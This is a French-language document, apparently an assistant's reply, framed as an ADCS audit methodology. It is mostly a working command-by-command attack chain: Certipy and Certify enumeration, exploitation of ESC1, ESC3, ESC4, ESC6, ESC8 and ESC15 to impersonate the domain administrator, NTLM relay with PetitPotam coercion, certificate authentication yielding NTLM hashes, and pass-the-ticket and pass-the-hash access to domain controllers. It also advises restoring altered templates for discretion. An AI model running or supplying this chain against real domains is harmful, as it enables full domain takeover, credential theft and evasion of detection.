Voici la méthodologie complète d'audit ADCS, organisée en phases, avec les commandes Linux et Windows à chaque étape.

## Phase 1 — Reconnaissance : la CA existe-t-elle ?

**Linux :**
```bash
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <dc_ip> -stdout
```

**Windows :**
```powershell
certutil -ca
# ou
Certify.exe cas
```

## Phase 2 — Énumération complète et détection des vulnérabilités

**Linux (Certipy) :**
```bash
# Scan complet avec détection automatique des ESC
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <dc_ip> -vulnerable -stdout

# Version détaillée sauvegardée en fichier (pour analyse manuelle)
certipy find -u '<user>@<domain>' -p '<password>' -dc-ip <dc_ip> -text -output adcs_audit
```

**Windows (Certify) :**
```powershell
Certify.exe find /vulnerable
```

**Complément BloodHound** (une fois les données ADCS collectées, voir échange précédent) :
```cypher
MATCH p = (u:User)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|Enroll|AutoEnroll*1..]->(ct:CertTemplate) RETURN p
```
```cypher
MATCH p=(n)-[:ADCSESC1|ADCSESC3|ADCSESC4|ADCSESC6|ADCSESC9|ADCSESC10*1..]->(m) RETURN p
```

## Phase 3 — Lecture du résultat : que chercher

Dans la sortie `-vulnerable`, repère la ligne `[!] Vulnerabilities` sous chaque template — Certipy te donne directement le nom de l'ESC détecté. Croise avec :
- **Enrollment Rights** : qui peut demander ce template ? (souvent `Domain Users` ou `Authenticated Users` = mauvais signe)
- **Client Authentication** : le certificat permet-il l'authentification ?
- **Requires Manager Approval : False** : pas de validation humaine nécessaire
- **Enrollee Supplies Subject : True** : le demandeur choisit l'identité → ESC1 direct

## Phase 4 — Exploitation selon l'ESC identifié

### ESC1 (SAN arbitraire)
```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA_name>' -template '<template>' -upn 'administrator@<domain>' -dc-ip <dc_ip>
```
```powershell
Certify.exe request /ca:<CA_name> /template:<template> /altname:administrator
```

### ESC3 (Enrollment Agent)
```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA_name>' -template '<agent_template>' -dc-ip <dc_ip>
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA_name>' -template '<target_template>' -on-behalf-of '<domain>\administrator' -pfx '<agent.pfx>' -dc-ip <dc_ip>
```

### ESC4 (droits d'écriture sur le template)
```bash
certipy template -u '<user>@<domain>' -p '<password>' -template '<template>' -save-old
# Puis exploite comme ESC1
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA_name>' -template '<template>' -upn 'administrator@<domain>'
# Restaure la config d'origine ensuite (discrétion)
certipy template -u '<user>@<domain>' -p '<password>' -template '<template>' -configuration '<saved_config.json>'
```

### ESC6 (flag CA dangereux)
```bash
certipy req -u '<user>@<domain>' -p '<password>' -ca '<CA_name>' -template 'User' -upn 'administrator@<domain>' -dc-ip <dc_ip>
```

### ESC8 (NTLM relay vers endpoint web)
```bash
ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Puis coerce l'authentification (PetitPotam, PrinterBug...)
python3 PetitPotam.py <listener_ip> <dc_ip>
```

### ESC15 (voir détail donné précédemment)
```bash
certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc_ip> -target <ca_server> -ca '<CA_name>' -template 'WebServer' -application-policies 'Client Authentication' -upn 'administrator@<domain>'
```

**Windows (module ADCS PowerShell générique pour la plupart des ESC via GUI/certreq) :**
```powershell
certreq -submit -config "<CA_server>\<CA_name>" request.inf certnew.cer
certreq -accept certnew.cer
```

## Phase 5 — Authentification avec le certificat obtenu

**Linux :**
```bash
certipy auth -pfx '<certificate.pfx>' -dc-ip <dc_ip>
```
Ça retourne directement le hash NTLM du compte usurpé.

**Windows :**
```powershell
Rubeus.exe asktgt /user:administrator /certificate:<cert.pfx> /password:<pfx_password> /ptt
```
`/ptt` injecte directement le TGT en mémoire (Pass-the-Ticket).

## Phase 6 — Post-exploitation avec le hash/ticket récupéré

**Pass-the-hash (Linux) :**
```bash
psexec.py '<domain>/administrator@<target_ip>' -hashes ':<ntlm_hash>'
# ou
evil-winrm -i <target_ip> -u administrator -H '<ntlm_hash>'
```

**Windows (avec ticket injecté via Rubeus) :**
```powershell
klist
dir \\<target_dc>\c$
```

## Résumé du workflow en une ligne de commande par étape

```bash
# 1. Recon
certipy find -u 'user@domain' -p 'pass' -dc-ip <dc_ip> -vulnerable -stdout

# 2. Exploit (exemple ESC1)
certipy req -u 'user@domain' -p 'pass' -ca 'CA-NAME' -template 'VulnTemplate' -upn 'administrator@domain'

# 3. Auth
certipy auth -pfx 'administrator.pfx' -dc-ip <dc_ip>

# 4. Post-exploit
evil-winrm -i <target_ip> -u administrator -H '<ntlm_hash>'
```

